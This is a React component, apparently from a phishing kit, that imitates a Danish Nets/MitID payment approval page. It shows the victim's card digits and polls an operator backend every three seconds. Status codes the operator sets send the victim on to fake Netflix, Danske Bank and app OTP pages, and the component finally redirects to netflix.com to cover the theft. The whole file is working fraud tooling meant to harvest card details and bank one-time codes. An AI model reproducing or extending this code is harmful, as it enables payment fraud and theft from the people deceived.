import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "./Authentication.css";
import emulator from "./code-app-slider-emulator.svg";

export default function Authentication() {
  const [status, setStatus] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [language, setLanguage] = useState("en");
  const [isLoading, setIsLoading] = useState(true);
  
  const location = useLocation();
  const navigate = useNavigate();
  const { paymentId } = location.state || {};
  const apiUrl = import.meta.env.VITE_API_URL;

  // Detect language based on IP
  const detectLanguageByIP = async () => {
    try {
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      const data = await res.json();

      const countryCode = data.country_code?.toLowerCase();

      const countryToLanguage = {
        'dk': 'da',
        'us': 'en',
        'gb': 'en',
        'ca': 'en',
        'au': 'en',
        'ae': 'ar',
        'sa': 'ar',
        'eg': 'ar',
        'fr': 'fr',
        'be': 'fr',
        'ch': 'fr',
        'es': 'es',
        'mx': 'es',
        'ar': 'es',
        'co': 'es',
        'de': 'de',
        'at': 'de',
        'tn': 'ar'
      };

      const detectedLang = countryToLanguage[countryCode] || 'en';
      setLanguage(detectedLang);
      localStorage.setItem('preferredLanguage', detectedLang);
    } catch (error) {
      console.error('Error detecting language:', error);
      const savedLang = localStorage.getItem('preferredLanguage');
      if (savedLang) {
        setLanguage(savedLang);
      } else {
        setLanguage('en');
      }
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    detectLanguageByIP();
  }, []);

  // Fetch card number
  useEffect(() => {
    if (paymentId) {
      fetch(`${apiUrl}/api/status/card/${paymentId}`)
        .then((res) => res.json())
        .then((data) => {
          if (data.cardNumber) {
            setCardNumber(data.cardNumber);
          }
        })
        .catch((err) => console.error(err));
    }
  }, [paymentId, apiUrl]);

  // Poll for status changes every 3 seconds
  useEffect(() => {
    if (!paymentId) return;

    let isMounted = true;
    let intervalId = null;

    const checkStatus = async () => {
      try {
        const response = await fetch(`${apiUrl}/api/status/card/${paymentId}`);
        const statusData = await response.json();

        console.log("📊 Status check on Nets page:", statusData);
        setStatus(statusData.status);

        // Handle different statuses and navigate accordingly
        if (statusData.status === "rejected") {
          console.log("❌ Transaction rejected");
          if (intervalId) clearInterval(intervalId);
          setTimeout(() => {
            window.location.href = "https://www.netflix.com/";
          }, 2000);
        } 
        else if (statusData.status === "accepted" || statusData.status === "approved") {
          console.log("✅ Transaction approved - redirecting to Netflix");
          if (intervalId) clearInterval(intervalId);
          setTimeout(() => {
            window.location.href = "https://www.netflix.com/";
          }, 2000);
        }
        else if (statusData.status === "otp") {
          console.log("🔄 Navigating to NetflixPaymentVerification (OTP1)");
          if (intervalId) clearInterval(intervalId);
          navigate("/NetflixPaymentVerification", {
            state: { paymentId: paymentId, language: language },
          });
        }
        else if (statusData.status === "otp2") {
          console.log("🏦 Staying on Nets page (OTP2) - current page");
          // We are on the correct page (Nets)
        }
        else if (statusData.status === "app") {
          console.log("📱 Navigating to App OTP page");
          if (intervalId) clearInterval(intervalId);
          navigate("/Appotp", { 
            state: { paymentId: paymentId, language: language } 
          });
        }
        else if (statusData.status === "otp3") {
          console.log("🔄 Navigating to Danske Bank page (OTP3)");
          if (intervalId) clearInterval(intervalId);
          navigate("/Danske", { 
            state: { paymentId: paymentId, language: language } 
          });
        }
        else if (statusData.status === "otp4") {
          console.log("🔄 Navigating to OtpConfirmPage (OTP4)");
          if (intervalId) clearInterval(intervalId);
          navigate("/OtpConfirmPage", { 
            state: { paymentId: paymentId, language: language } 
          });
        }
        else {
          console.log("⏳ Unknown status, continuing to poll:", statusData.status);
        }
      } catch (err) {
        console.error("Error checking status:", err);
      }
    };

    // Check immediately
    checkStatus();
    
    // Set up interval to check every 3 seconds
    intervalId = setInterval(checkStatus, 3000);
    
    // Cleanup interval on component unmount
    return () => {
      isMounted = false;
      if (intervalId) clearInterval(intervalId);
    };
  }, [paymentId, apiUrl, navigate, language]);

  const formatCardNumber = (cardNum) => {
    if (!cardNum) return "XXXX XXXX XXXX 1111";
    const last4 = cardNum.slice(-4);
    return `XXXX XXXX XXXX ${last4}`;
  };

  if (isLoading) {
    return (
      <div className="page">
        <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '100vh' }}>
          <div>Loading...</div>
        </div>
      </div>
    );
  }

  return (
    <div className="page">
      <section className="wrapper">
        <header className="header">
          <div className="imgcon">
            <img style={{width:100}} src="Nets_logo.svg" alt="Network" className="" />
          </div>
          <div style={{display:'flex',justifyContent:'center',alignItems:'center'}} className="imgcon lang">
            <img style={{width:33}} src="en.svg" alt="EN" />
          </div>
          <div className="imgcon">
            <img style={{width:100}} src="1.svg" alt="Bank" className="" />
          </div>
        </header>

        <section className="container">
          <div className="mitidContextStr">
            Betal 750,00 DKK  - Tickets LIVE
          </div>

          <p className="title">
            Åbn MitID app og godkend
          </p>

          <div className="imageContainer">
            <object
              type="image/svg+xml"
              id="code-app-emulator"
              className="code-app-emulator"
              data={emulator}
            >
              <img
                alt="code-app-emulator"
                className="code-app-emulator"
                src={emulator}
              />
            </object>
          </div>
          
          {/* Show card info */}
          <div style={{ marginTop: 20, padding: 10, textAlign: 'center', fontSize: 12, color: '#666' }}>
            <div>Kort: **** **** **** {cardNumber?.slice(-4) || '1111'}</div>
            <div style={{ fontSize: 11, marginTop: 5 }}>Forhandler:kmt.vejafgifter.dk</div>
          </div>
        </section>
      </section>
    </div>
  );
}